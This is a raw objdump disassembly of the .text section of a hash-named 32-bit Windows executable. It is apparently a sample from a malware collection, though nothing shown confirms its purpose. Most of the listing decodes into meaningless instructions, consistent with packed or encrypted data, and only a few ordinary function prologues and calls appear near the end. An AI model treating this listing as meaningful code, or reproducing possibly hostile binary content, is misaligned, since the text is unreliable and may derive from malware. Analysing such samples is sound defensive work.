
9075b19487a43a45fbdba0b22f689f5f0e2e6a261793b33e986c9bb96627c271.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	or     BYTE PTR [ecx],al
  4d0002:	cmc    
  4d0003:	xor    cl,BYTE PTR [edx-0x55]
  4d0006:	add    ebx,DWORD PTR [esi+0x50fc0e2e]
  4d000c:	and    ebp,DWORD PTR [esi]
  4d000e:	gs sub ah,0xc8
  4d0012:	inc    esi
  4d0013:	aad    0x2d
  4d0015:	mov    al,0xb6
  4d0017:	mov    edx,0xd5d9a824
  4d001c:	or     BYTE PTR [ecx],ah
  4d001e:	stos   BYTE PTR es:[edi],al
  4d001f:	jmp    0x4d001d
  4d0021:	xor    esi,DWORD PTR [esi+esi*8-0x1efaffe]
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0662
  4d06c1:	rcl    eax,cl
  4d06c3:	mov    edx,DWORD PTR [esi+0x2859b266]
  4d06c9:	enter  0xbe25,0x35
  4d06cd:	mov    dh,BYTE PTR [ecx+0x75]
  4d06d0:	arpl   WORD PTR [eax+ecx*2+0x278f8411],sp
  4d06d7:	repnz dec ebp
  4d06d9:	sbb    bl,BYTE PTR [edx+0x76]
  4d06dc:	jl     0x4d06e9
  4d06de:	fldenv [esi+0x15]
  4d06e1:	(bad)  
  4d06e2:	fadd   DWORD PTR [eax+0x1f3b126d]
  4d06e8:	fisub  WORD PTR [ecx+edx*8]
  4d06eb:	test   eax,0x8b55ff8b
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x50
  4d06f4:	lea    eax,[edx+0x128]
  4d06fa:	sbb    DWORD PTR [eax-0x12c],edi
  4d0700:	push   eax
  4d0701:	push   ebx
  4d0702:	push   esi
  4d0703:	push   DWORD PTR [eax+0x1cc]
  4d0709:	push   DWORD PTR [eax+0x74]
  4d070c:	call   0x4d1594
  4d0711:	add    esp,0x10
  4d0714:	pop    eax
  4d0715:	push   eax
  4d0716:	mov    edi,0x0
  4d071b:	push   edi
  4d071c:	call   0x4d0870
  4d0721:	add    esp,0x4
  4d0724:	pop    eax
  4d0725:	push   eax
  4d0726:	mov    ecx,0x0
  4d072b:	push   ecx
  4d072c:	call   0x4d13c0
  4d0731:	add    esp,0x4
  4d0734:	pop    eax
  4d0735:	add    esp,0x50
  4d0738:	pop    ebp
  4d0739:	ret    
  4d073a:	add    BYTE PTR [eax],al
  4d073c:	pop    edi
  4d073d:	call   DWORD PTR ds:0x4d2020
  4d0743:	call   edi
  4d0745:	add    BYTE PTR [eax],al
  4d0747:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d074d:	sub    esp,0x40
  4d0750:	lea    edi,[esi+0x48]
  4d0753:	sbb    DWORD PTR [edi-0x70],0xffffc6fd
  4d075a:	push   edi
  4d075b:	push   0x0
  4d075d:	call   0x4d10b8
  4d0762:	add    esp,0x4
  4d0765:	pop    edi
  4d0766:	push   edi
  4d0767:	push   edx
  4d0768:	push   DWORD PTR [edi+0x1c4]
  4d076e:	push   esi
  4d076f:	push   ecx
  4d0770:	call   0x4d1434
  4d0775:	add    esp,0x10
  4d0778:	pop    edi
  4d0779:	push   edi
  4d077a:	call   0x4d073c
  4d077f:	add    esp,0x4
  4d0782:	pop    edi
  4d0783:	add    esp,0x40
  4d0786:	pop    ebp
  4d0787:	ret    
  4d0788:	mov    edi,edi
  4d078a:	push   ebp
  4d078b:	mov    ebp,esp
  4d078d:	sub    esp,0x44
  4d0790:	lea    edi,ds:0x4d31f0
  4d0796:	and    ecx,DWORD PTR [edi-0x84]
  4d079c:	push   edi
  4d079d:	call   0x4d0c68
